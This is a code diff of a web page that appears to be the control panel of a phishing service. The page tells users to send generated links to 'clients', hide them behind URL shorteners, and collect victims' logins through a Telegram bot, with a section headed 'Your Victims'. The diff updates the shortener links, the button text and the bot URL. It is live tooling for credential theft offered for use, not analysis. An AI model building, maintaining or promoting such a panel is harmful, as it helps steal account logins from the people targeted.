@@ -179,9 +179,9 @@
   <b>
     Click on the "open" button to test your link before you send it to your clients, 
     and also remember to shorten it in any link shorten website like 
-    <a href="#" onclick="openWithAd('https://bitly.com/')" style="color:pink;">bitly</a> 
+    <a href="https://play.google.com/store/apps/details?id=app.shorten.urlshorten.url.linkshortener.link.shortener.bitly.oneurl" target="_blank" onclick="openWithAd('https://play.google.com/store/apps/details?id=app.shorten.urlshorten.url.linkshortener.link.shortener.bitly.oneurl')" style="color:pink;">bitly</a> 
     or 
-    <a href="#" onclick="openWithAd('https://tinyurl.com/')" style="color:pink;">tinyurl</a> 
+    <a href="https://play.google.com/store/apps/details?id=app.shorten.urlshorten.url.linkshortener.link.shortener.bitly.oneurl" target="_blank" onclick="openWithAd('https://play.google.com/store/apps/details?id=app.shorten.urlshorten.url.linkshortener.link.shortener.bitly.oneurl')" style="color:pink;">tinyurl</a> 
     when you copy the link
   </b>
 </p>
@@ -203,7 +203,7 @@
   }
 </script>
       <p>Open the bot to receive all your client login.</p>
-<button id="openBotBtnHome" class="btn">Click here to copy working format for all these links, to make your husle more easier.</button>
+<button id="openBotBtnHome" class="btn">Generate your own custom link that will work for your husle by clicking here.</button>
 <ul id="freeLinksList" class="link-list"></ul>
     </section>
     <!-- Premium Section -->
@@ -220,7 +220,7 @@
     <!-- Victim Section -->
     <section id="victim" class="page" style="text-align:center;">
       <h2>Your Victims</h2>
-      <p>Open the bot to view all your victims.</p>
+      <p>We don't save your Victim logs in our server this bot will send it to you when your Victim login just make sure you open the bot and send /start now.</p>
       <button id="openBotBtnVictim" class="btn">👉 Open Bot</button>
     </section>
 
@@ -525,7 +525,7 @@ function renderFreeLinks() {
   document.getElementById("openBotBtnHome").addEventListener("click", () => {
     showMyAd()
       .then(() => {
-        window.open("http://t.me/intelligentverificationlinkbot/formatlink");
+        window.open("http://t.me/intelligentverificationlinkbot/customlink");
       })
       .catch(() => {
         // Even if ad fails → still open bot
